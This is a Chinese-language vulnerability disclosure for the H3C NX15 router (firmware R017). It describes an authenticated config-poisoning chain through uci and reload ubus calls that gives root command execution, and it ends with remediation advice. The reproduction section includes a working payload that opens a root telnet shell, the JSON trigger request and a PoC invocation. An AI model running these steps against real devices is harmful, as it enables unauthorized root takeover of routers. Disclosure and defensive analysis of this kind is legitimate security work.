# H3C NX15 R017 `uci.add` 与 `reload.reload_config` 配置污染 root RCE 链报告

## 一、漏洞概述

H3C NX15 路由器 NX15V100R017 固件的 `/api/esps` 接口可在管理员认证后访问原始 `uci` 和 `reload` ubus 对象。攻击者可先通过 `uci.add`/`uci.commit` 向 `smartwaretrack` 配置写入恶意 `exec` 字段，再调用 `reload.reload_config` 使用合法配置名触发 `/sbin/config_reload`，最终使后端执行配置中的恶意命令。

该漏洞不是简单的分号注入，而是“配置污染 + 合法 reload 触发”的多对象组合 root RCE 链。

## 二、影响范围

- 厂商：H3C
- 产品：H3C NX15 路由器
- 影响版本：NX15V100R017 / R017
- 漏洞类型：配置污染 / 危险 RPC 暴露 / root 远程命令执行
- 认证要求：需要管理员 Web 会话
- 漏洞接口：`POST /api/esps`
- 涉及对象：`uci`、`reload`
- 影响结果：root 权限任意命令执行

## 三、漏洞链路

完整利用链如下：

1. 攻击者登录 Web 管理后台并获取管理员会话。
2. 通过 `/api/esps` 调用原始对象 `uci.add`。
3. 向 `smartwaretrack` 配置添加恶意 section，例如：

   ```text
   config ctf 'pocx'
       option exec '<command>'
   ```

4. 调用 `uci.commit` 保存配置。
5. 调用原始对象 `reload.reload_config`，使用合法参数：

   ```text
   config = pocx
   method = reload
   status = 1
   ```

6. `/sbin/config_reload pocx` 读取 `smartwaretrack` 中的 `exec` 字段。
7. 后端执行攻击者写入的命令，权限为 root。

## 四、根因分析

### 1. Web API 暴露原始 UCI 写接口

`/api/esps` 不仅能访问业务对象，也能访问原始 `uci` 对象。管理员认证后，攻击者可通过 Web API 修改系统配置。

涉及方法包括：

```text
uci.add
uci.set
uci.commit
```

这些方法本身具有较高权限，不应直接暴露给远程 Web 调用方。

### 2. `smartwaretrack` 配置中的 `exec` 字段可影响 reload 行为

`/sbin/config_reload` 在处理特定配置名时，会读取 `smartwaretrack` 配置中的 `exec` 字段并执行。攻击者如果能污染该配置，就可控制后续 reload 执行内容。

### 3. 触发阶段使用合法参数

与直接命令注入不同，本链触发 `reload.reload_config` 时不需要在 `config` 参数中加入分号、命令替换或其它 shell 注入字符。触发参数可以是普通配置名：

```json
{
  "config": "pocx",
  "method": "reload",
  "status": 1
}
```

这说明即使只修复 `reload.reload_config` 中的命令拼接注入，只要仍允许 Web 访问原始 `uci` 写接口和 `reload` 对象，该组合链仍可能成立。

## 五、固件内定位路径

以下路径均为相对于解压后固件根文件系统的固件内部路径，用于审计定位：

- `/www/api`：Web API 二进制，负责处理认证后的 `/api/esps` 请求并转发 ubus 对象调用。
- `uci` ubus 对象提供者：运行时暴露 `uci.add`、`uci.set`、`uci.commit` 等配置写接口；在解压固件中可通过搜索对象名 `uci` 和方法名 `commit` 定位。
- `reload` ubus 对象提供者：运行时暴露 `reload.reload_config`；在解压固件中可通过搜索 `reload_config` 和 `/sbin/config_reload` 定位。
- `/sbin/config_reload`：reload 触发的配置重载脚本，会读取 `smartwaretrack` 中的 `exec` 字段。
- `/etc/config/smartwaretrack`：被污染的 UCI 配置文件，攻击者写入恶意 section 和 `exec` 字段。

## 六、复现步骤

### 1. 登录获取管理员会话

通过 Web 登录接口获取管理员 session，并在后续请求中设置：

```text
AUTHENTICATION: <session>
```

### 2. 写入恶意 `smartwaretrack` 配置

通过 `/api/esps` 调用 `uci.add` 和 `uci.commit`，写入类似配置：

```text
config ctf 'pocx'
    option exec 'telnetd -p2351 -l /bin/sh'
```

### 3. 使用合法参数触发 reload

调用：

```json
[
  {
    "id": 1,
    "object": "reload",
    "method": "reload_config",
    "param": {
      "config": "pocx",
      "method": "reload",
      "status": 1
    }
  }
]
```

### 4. 使用附件 PoC 验证

```bash
python3 poc/19_postauth_uci_smartwaretrack_exec_rce.py \
  --base http://192.168.8.1 \
  --username admin \
  --password '<admin-password>' \
  --port 2351
```

预期结果：

```text
uid=0(root)
```

## 七、验证结果

在 NX15V100R017 测试设备上，PoC 成功完成：

- 调用 `/api/esps` 写入 `smartwaretrack` 恶意配置。
- 提交配置变更。
- 使用不包含注入字符的合法 `reload.reload_config` 参数触发后端流程。
- 启动 root shell 并执行 `id`，返回 `uid=0(root)`。

## 八、危害说明

该漏洞可造成：

- 已认证攻击者获得 root 权限。
- 通过配置污染实现持久化命令执行。
- 绕过只针对 reload 参数注入的局部修复。
- 配合未授权账号接管漏洞时，可形成未授权到 root 的完整攻击链。

## 九、附件

- 报告：`report/25_postauth_uci_reload_smartwaretrack_exec_chain.md`
- PoC：`poc/19_postauth_uci_smartwaretrack_exec_rce.py`

## 十、修复建议

- `/api/esps` 应禁止访问原始 `uci`、`reload` 等高危系统对象，改为业务级安全接口。
- 对 Web 可调用的 ubus 对象和方法建立严格白名单。
- `smartwaretrack` 等配置中的 `exec` 字段不应由远程配置写接口控制。
- `/sbin/config_reload` 不应执行配置文件中的未信任命令。
- 对 reload 触发流程增加配置来源校验、签名校验和操作审计。
